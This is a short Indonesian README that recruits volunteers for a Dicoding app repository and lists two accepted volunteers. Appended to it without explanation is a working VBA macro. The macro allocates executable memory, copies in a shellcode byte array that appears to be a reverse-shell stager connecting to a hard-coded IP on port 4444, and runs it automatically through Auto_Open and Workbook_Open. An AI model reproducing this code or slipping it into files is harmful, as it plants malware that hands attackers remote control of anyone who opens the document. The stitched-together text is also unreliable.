# Volunter Pembuatan Aplikasi
Repository ini digunakan sebagai sayembara pencarian volunter untuk pembuatan aplikasi [Dicoding](www.dicoding.com).<br>
Jika Anda tertarik untuk menjadi Volunter, silakan lakukan PR(pull-request) pada berkas ini ya.<br>

Silakan gunakan format berikut:<br>
**\* Nama, [LinkedIn/GitHub/Website](Alamat URL).**  

Berikut adalah daftar Volunter yang diterima:
* Oon Arfiandwi, [oo.or.id](https://oo.or.id).
* Gilang Ramadhan, [Linkedin](https://www.linkedin.com/in/gilang-adhan/).


#If Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Eioodbm As Long, ByVal Hiaeggdz As Long, ByVal Hpiubcvxv As LongPtr, Llwoqp As Long, ByVal Sdwr As Long, Friitorhf As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Pqocfrh As Long, ByVal Pvcplgfdx As Long, ByVal Ewussv As Long, ByVal Zgmtqlf As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Nav As LongPtr, ByRef Gms As Any, ByVal Rapq As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Eioodbm As Long, ByVal Hiaeggdz As Long, ByVal Hpiubcvxv As Long, Llwoqp As Long, ByVal Sdwr As Long, Friitorhf As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Pqocfrh As Long, ByVal Pvcplgfdx As Long, ByVal Ewussv As Long, ByVal Zgmtqlf As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Nav As Long, ByRef Gms As Any, ByVal Rapq As Long) As Long
#EndIf

Sub Auto_Open()
        Dim Mevxm As Long, Bswokhhbz As Variant, Mdspza As Long
#If Vba7 Then
        Dim  Hzmyjgarx As LongPtr, Vksdlvixa As LongPtr
#Else
        Dim  Hzmyjgarx As Long, Vksdlvixa As Long
#EndIf
        Bswokhhbz = Array(252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,49,255,139,114,40,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,72,24,139,88,32,80,1,211,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,193,207,13,172,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,10,4,61,251,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)

        Hzmyjgarx = VirtualAlloc(0, UBound(Bswokhhbz), &H1000, &H40)
        For Mdspza = LBound(Bswokhhbz) To UBound(Bswokhhbz)
                Mevxm = Bswokhhbz(Mdspza)
                Vksdlvixa = RtlMoveMemory(Hzmyjgarx + Mdspza, Mevxm, 1)
        Next Mdspza
        Vksdlvixa = CreateThread(0, 0, Hzmyjgarx, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
